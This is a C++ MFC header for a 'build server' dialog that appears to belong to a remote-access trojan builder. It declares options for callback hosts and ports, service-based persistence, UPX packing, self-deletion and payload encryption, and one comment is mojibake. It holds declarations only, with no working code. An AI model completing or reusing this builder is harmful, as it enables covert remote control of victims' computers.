#if !defined(AFX_BUILDSERVER_H__B9B38A19_9859_4C73_8688_313F17DD4851__INCLUDED_)
#define AFX_BUILDSERVER_H__B9B38A19_9859_4C73_8688_313F17DD4851__INCLUDED_
#include "xinfotip.h"
#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000
// Build.h : header file
//

/////////////////////////////////////////////////////////////////////////////
// CBuildServer dialog
////////////////////////////////////////////////////////////////////


class CBuild : public CDialog
{
// Construction
public:



	CBuild(CWnd* pParent = NULL);   // standard constructor
    virtual BOOL PreTranslateMessage(MSG* pMsg);
	BOOL IsFileExist(LPCTSTR strFileName);
	BOOL CompressUpx(CString inpath);
//	virtual int memfind(const char *mem, const char *str, int sizem, int sizes);
	CIniFile m_inifile;
// Dialog Data
	//{{AFX_DATA(CBuildServer)
	enum { IDD = IDD_BUILD};
	CButton	m_zs_build;
	CButton	m_zc_build;
	CStatic	m_Ico;
	CEdit	m_log;
	CComboBox	m_remote_path;
	CComboBox	m_group_name;
	CComboBox	m_fileattribute;
	CComboBox	m_filealeixing;
	CComboBox	m_insatll_way;
	CButton	m_testBtn2;
	CButton	m_testBtn1;
	CString m_releasepath;
	CString m_houzuiming;
	CString	m_remote_host1;
	CString	m_remote_host2;
	UINT	m_remote_port1;
	UINT	m_remote_port2;
	CString	m_remote_name;
	CString	m_strVersion;
	CString	m_ServiceName;
	CString	m_ServiceDisplayName;
	CString	m_ServiceDescription;
	BOOL	m_delrtd;
	CHAR	m_zrAzst;
	BOOL	m_zraz;
	BOOL	m_zraz1;
	BOOL	m_zraz2;
	BOOL	m_zkfkzj;
	BOOL	m_upx;
	BOOL	m_zkfsms;
	BOOL	m_gdtj;
	BOOL	m_meux;
	DWORD	m_azzds;
	CString	m_exemeux;
	CString	m_dllname;
	CString	m_edit_kb;
	BOOL	m_kbcheck;
	BOOL	m_baocun;
	BOOL	m_changurl;
	//}}AFX_DATA


// Overrides
	// ClassWizard generated virtual function overrides
	//{{AFX_VIRTUAL(CBuildServer)
	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV support
	//}}AFX_VIRTUAL

// Implementation
protected:
       
	// ∆¯≈›Ã· æ
	CXInfoTip m_tooltip;
	// Generated message map functions
	//{{AFX_MSG(CBuildServer)
	virtual BOOL OnInitDialog();
	afx_msg void OnTestMaster1();
	afx_msg void OnTestMaster2();
	afx_msg void OnLButtonDown(UINT nFlags, CPoint point);
	afx_msg void OnLButtonDblClk(UINT nFlags, CPoint point);
	afx_msg BOOL OnSetCursor(CWnd* pWnd, UINT nHitTest, UINT message);
	afx_msg VOID MyEncryptFunctionForServer(LPSTR szData,WORD Size);
	afx_msg void TestMaster1();
	afx_msg void TestMaster2();
	afx_msg void OnzrppccAz();
	afx_msg void OnZraz();
	afx_msg void OnZraz1();
	afx_msg void OnZraz2();
	afx_msg void OnGdtj();
	afx_msg void OnMeux();
	afx_msg void OnSelectIco();
	afx_msg void OnKbtest();
	afx_msg void OnKbcheck();
	afx_msg HBRUSH OnCtlColor(CDC* pDC, CWnd* pWnd, UINT nCtlColor);
	afx_msg void OnExit();
	afx_msg void OnRandom();
	afx_msg void OnBuild();
	afx_msg BOOL CreateServer(DLLSERVER_INFO *lpData,LPSTR szPath,char *datPaths);
	afx_msg void OnHuoquZp();
	afx_msg void OnHuoquCp();
	afx_msg void OnZsBuild();
	afx_msg void OnZcBuild();
	//}}AFX_MSG
	DECLARE_MESSAGE_MAP()
};

//{{AFX_INSERT_LOCATION}}
// Microsoft Visual C++ will insert additional declarations immediately before the previous line.

#endif // !defined(AFX_BUILDSERVER_H__B9B38A19_9859_4C73_8688_313F17DD4851__INCLUDED_)
